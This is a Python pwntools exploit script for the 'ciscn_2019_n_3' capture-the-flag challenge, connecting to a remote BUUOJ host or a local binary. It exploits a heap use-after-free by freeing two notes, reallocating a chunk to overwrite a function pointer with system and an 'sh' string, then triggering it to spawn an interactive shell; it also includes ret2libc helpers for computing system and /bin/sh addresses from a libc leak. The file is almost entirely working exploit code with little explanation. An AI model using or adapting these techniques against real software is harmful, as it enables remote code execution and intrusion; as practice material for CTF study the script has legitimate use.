from pwn import  *
from LibcSearcher import LibcSearcher
from sys import argv

def ret2libc(leak, func, path=''):
	if path == '':
		libc = LibcSearcher(func, leak)
		base = leak - libc.dump(func)
		system = base + libc.dump('system')
		binsh = base + libc.dump('str_bin_sh')
	else:
		libc = ELF(path)
		base = leak - libc.sym[func]
		system = base + libc.sym['system']
		binsh = base + libc.search('/bin/sh').next()

	return (system, binsh)

s       = lambda data               :p.send(str(data))
sa      = lambda delim,data         :p.sendafter(str(delim), str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda delim,data         :p.sendlineafter(str(delim), str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,'\0'))
uu64    = lambda data               :u64(data.ljust(8,'\0'))
leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))

context.log_level = 'DEBUG'
binary = './ciscn_2019_n_3'
context.binary = binary
elf = ELF(binary)
p = remote('node3.buuoj.cn',28460) if argv[1]=='r' else process(binary)

# start
def add(index,len,content='a'):
	sla('CNote > ','1')
	sla('Index > ',str(index))
	sla('Type > ','2')
	sla('Length > ',str(len))
	sla('Value > ',content)

def delete(index):
	sla('CNote > ','2')
	sla('Index > ',str(index))

add(0,0x10)
add(1,0x10)
delete(0)
delete(1)
add(2,0xc,'sh\x00\x00'+p32(elf.sym['system']))
# 0xc from 1, then 0xc from 0
delete(0)
# end

itr()